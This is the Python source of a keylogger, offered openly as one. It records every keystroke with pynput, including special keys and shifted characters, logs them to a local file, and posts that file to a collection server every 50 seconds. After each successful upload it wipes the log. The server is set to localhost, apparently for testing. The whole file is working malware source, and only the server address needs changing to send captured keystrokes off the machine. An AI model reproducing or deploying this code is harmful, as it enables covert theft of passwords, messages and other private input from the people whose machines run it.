import schedule
import time
import requests
from pynput import keyboard
import uuid

# Define the sequence to stop the keylogger (case-sensitive)
stop_sequence = "daddy"
current_sequence = ""
serverURL="http://localhost:5000/upload"
# Track Shift key state
shift_pressed = False

def get_mac_address():
    print("Getting MAC address...")
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e+2] for e in range(0, 11, 2)])

def on_press(key):
    global current_sequence, shift_pressed

    try:
        # Handle Shift key state
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = True
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = False

        # Handle regular character keys
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            # Append Shift indication if Shift is pressed
            if shift_pressed:
                char = f"[SHIFT+{char.upper()}]"
            else:
                char = char.lower()

            # Append character to current sequence and check stop condition
            current_sequence += char
            if current_sequence[-len(stop_sequence):] == stop_sequence:
                print(f"'{stop_sequence}' detected. Stopping keylogger.")
                return False  # Stops the listener

            # Write the character to the file
            with open("keyfile1.txt", 'a') as logKey:
                logKey.write(char)
                logKey.flush()  # Ensure data is written to disk immediately

        # Handle space key
        elif key == keyboard.Key.space:
            current_sequence += ' '
            with open("keyfile1.txt", 'a') as logKey:
                logKey.write(' ')
                logKey.flush()  # Ensure data is written to disk immediately

        # Handle other special keys
        else:
            special_key = str(key).replace("Key.", "")
            if special_key:  # Avoid empty strings
                with open("keyfile1.txt", 'a') as logKey:
                    logKey.write(f"[{special_key}]")
                    logKey.flush()  # Ensure data is written to disk immediately

    except Exception as e:
        # Print any exceptions for debugging
        print(f"Error: {e}")

def on_release(key):
    global shift_pressed
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = False

def upload_file():
    try:
        with open("keyfile1.txt", 'rb') as file:
            response = requests.post(serverURL, files={'file': file})
            if response.status_code == 200:
                print("File uploaded successfully.")
                response_data = response.json()
                if response_data.get("success") == True:
                    with open("keyfile1.txt", 'w') as file:
                        file.write("")
                    print("File contents wiped after successful upload.")
            else:
                print(f"Failed to upload file. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error during file upload: {e}")

# Schedule the file upload every hour
#schedule.every().hour.do(upload_file)

# Schedule the file upload every 10 seconds for testing
schedule.every(50).seconds.do(upload_file)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    print("Keylogger started. Press 'daddy' to stop.")
    while True:
        schedule.run_pending()
        time.sleep(1)
        listener.join()  # Keeps the program running until the keylogger is stopped
